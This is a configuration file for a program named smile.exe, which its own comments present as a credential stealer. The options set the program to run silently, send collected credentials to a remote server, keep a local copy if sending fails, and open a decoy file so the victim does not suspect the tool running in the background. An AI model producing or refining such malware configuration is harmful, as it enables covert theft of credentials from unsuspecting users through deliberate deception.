; .......................................................
; CONFIGURATIONS FOR smile.exe
; .......................................................
; This file contains the configurations for the smile software.
; You can change the configurations as you wish.
;
; Detailed Explanations:
;
; 1. USER_ID
;    Description: A unique identifier for the user.
;    Required: Yes (if you want to track status or send data).
;    Example: USER_ID=user123
;
; 2. MODE
;    Description: Controls the operating mode of the application.
;    Options:
;      - silent: (Default) The application runs without showing explicit UI or console output (intended behavior).
;      - show: The application may show output or run in a visible mode.
;
; 3. WRITE_FILE
;    Description: Controls when to save the collected credentials to a local file.
;    Options:
;      - offline: (Default) Save to file ONLY if sending data to the server fails.
;      - forever: ALWAYS save to file, regardless of server connection status.
;      - never: NEVER save to file.
;
; 4. ONLINE
;    Description: Controls whether the application attempts to send data to the remote server.
;    Options:
;      - true: (Default) Enable sending data to server.
;      - false: Disable sending data to server (Offline mode).
;
; 5. FEATURE_OPEN_FILE
;    Description: Specify a file path or command to execute when the application starts.
;                 This can be used to open a decoy file (e.g., an image or PDF) so the user
;                 doesn't suspect anything while the tool runs in the background.
;    Example: FEATURE_OPEN_FILE=C:\Users\Public\Documents\image.jpg
;
; .......................................................

USER_ID=CHANGE_ME
MODE=silent
WRITE_FILE=offline
ONLINE=true
FEATURE_OPEN_FILE=
